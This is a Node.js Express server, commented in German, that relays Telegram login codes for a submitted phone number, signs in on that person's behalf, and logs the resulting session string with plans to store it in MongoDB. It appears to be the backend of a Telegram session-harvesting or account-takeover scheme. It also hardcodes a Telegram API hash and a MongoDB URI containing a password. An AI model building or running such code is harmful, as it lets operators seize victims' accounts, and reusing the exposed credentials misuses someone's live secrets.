const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });

const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI);

// Temporärer Speicher für phoneCodeHash (da wir keine Datenbank für Session-States haben)
let pendingAuth = {};

app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        pendingAuth[phone] = result.phoneCodeHash;
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (err) {
        console.error(err);
        res.status(400).json({ error: err.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code } = req.body;
        const phoneCodeHash = pendingAuth[phone];
        
        if (!phoneCodeHash) throw new Error("Kein aktiver Login-Vorgang gefunden.");

        const me = await client.signIn({ apiId, apiHash }, phone, {
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        // Hier wird die Session extrahiert und gespeichert
        const sessionString = client.session.save();
        console.log("Session gespeichert:", sessionString);
        
        // Speichern in MongoDB (optionaler Schritt, falls du ein Schema hast)
        // await SessionModel.create({ phone, session: sessionString });

        res.json({ success: true, user: me });
    } catch (err) {
        console.error(err);
        res.status(400).json({ error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server läuft auf Port ${PORT}`);
});
